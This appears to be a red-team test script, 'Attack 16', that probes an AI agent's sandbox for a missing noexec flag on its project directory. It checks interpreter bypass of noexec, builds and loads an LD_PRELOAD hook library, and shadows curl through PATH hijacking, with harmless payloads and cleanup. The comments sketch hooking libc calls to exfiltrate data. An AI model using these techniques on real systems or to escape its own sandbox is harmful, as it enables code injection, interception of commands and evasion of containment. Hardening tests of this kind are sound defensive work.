# LAB ARTIFACT — fake attack for hardening demonstration only
# Attack 16: LD_PRELOAD Hijack via project/ (noexec gap)
#
# Goal: Test whether a shared library (.so) placed in project/ (which lacks
#        noexec) can be loaded via LD_PRELOAD to hook libc functions in all
#        subsequent processes. /tmp has noexec, but project/ does NOT.
#
# Target: /home/agent/project/ — LD_PRELOAD with .so from writable mount

set -e

PROJECT="/home/agent/project"

echo "[attack-16] Attempting LD_PRELOAD hijack via project/ directory..."

# Test 1: Verify noexec on tmpfs
echo "[attack-16] Test 1: noexec check on /tmp"
cat > /tmp/test-exec.sh 2>/dev/null <<'SH' || true
#!/bin/sh
echo "executed from /tmp"
SH
chmod +x /tmp/test-exec.sh 2>/dev/null || true
/tmp/test-exec.sh 2>&1 || echo "[attack-16]   /tmp has noexec (direct exec blocked)"
# But interpreter bypass works:
sh /tmp/test-exec.sh 2>&1 || echo "[attack-16]   interpreter bypass also failed"
rm -f /tmp/test-exec.sh 2>/dev/null || true

# Test 2: Check if project/ has noexec
echo "[attack-16] Test 2: noexec check on project/"
cat > "$PROJECT/test-exec.sh" 2>&1 <<'SH' || true
#!/bin/sh
echo "executed from project/"
SH
chmod +x "$PROJECT/test-exec.sh" 2>/dev/null || true
"$PROJECT/test-exec.sh" 2>&1 || echo "[attack-16]   project/ has noexec (good!)"
sh "$PROJECT/test-exec.sh" 2>&1 || echo "[attack-16]   interpreter bypass also failed"
rm -f "$PROJECT/test-exec.sh" 2>/dev/null || true

# Test 3: Create a C source for a malicious .so (can't compile without gcc,
#          but demonstrate the concept with a script wrapper)
echo "[attack-16] Test 3: LD_PRELOAD concept test"

# Check if gcc/cc is available
if command -v gcc >/dev/null 2>&1 || command -v cc >/dev/null 2>&1; then
    echo "[attack-16]   Compiler found — creating malicious .so"
    cat > /tmp/hook.c 2>/dev/null <<'C' || true
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    fprintf(stderr, "[HOOK] LD_PRELOAD library loaded — all libc calls intercepted\n");
    /* In a real attack: hook open(), read(), write(), connect() to exfiltrate data */
}
C
    gcc -shared -fPIC -o "$PROJECT/hook.so" /tmp/hook.c 2>/dev/null || true
    if [ -f "$PROJECT/hook.so" ]; then
        echo "[attack-16]   Attempting LD_PRELOAD with hook.so from project/"
        LD_PRELOAD="$PROJECT/hook.so" /bin/echo "test" 2>&1 || true
    fi
    rm -f /tmp/hook.c "$PROJECT/hook.so" 2>/dev/null || true
else
    echo "[attack-16]   No compiler available (good — minimal image)"
    echo "[attack-16]   In a real attack, a pre-compiled .so could be base64-decoded"
fi

# Test 4: PATH hijacking — shadow system commands
echo "[attack-16] Test 4: PATH hijacking via project/"
mkdir -p "$PROJECT/bin" 2>/dev/null || true
cat > "$PROJECT/bin/curl" 2>&1 <<'SH' || true
#!/bin/sh
# Shadow curl — intercept all curl commands
echo "[HIJACK] curl intercepted! Args: $@" >&2
echo "$@" | sh -c 'cat > /home/agent/project/intercepted-curl.log' 2>/dev/null
# Optionally call the real curl
/usr/bin/curl "$@"
SH
chmod +x "$PROJECT/bin/curl" 2>/dev/null || true

# Test if PATH hijack works
PATH="$PROJECT/bin:$PATH" curl --version 2>&1 | head -1 || true

# Cleanup
rm -rf "$PROJECT/bin" "$PROJECT/intercepted-curl.log" 2>/dev/null || true

echo "[attack-16] Attack attempts complete."
